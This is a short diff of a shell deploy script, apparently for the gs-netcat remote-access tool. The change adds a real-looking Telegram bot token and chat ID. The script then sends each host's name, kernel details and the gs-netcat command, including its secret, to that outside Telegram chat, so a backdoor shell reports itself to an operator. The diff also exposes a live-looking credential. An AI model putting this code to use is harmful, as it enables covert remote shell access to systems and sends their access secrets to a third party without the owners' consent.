@@ -89,8 +89,8 @@ unset gs_deploy_webhook
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
-# GS_TG_TOKEN="5794110125:AAFDNb..."
-# GS_TG_CHATID="-8834838..."
+GS_TG_TOKEN="8139434527:AAF5hj9ZvZd1FOiJc7hiRohhduIgFEQzeqs"
+GS_TG_CHATID="7439804416"
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
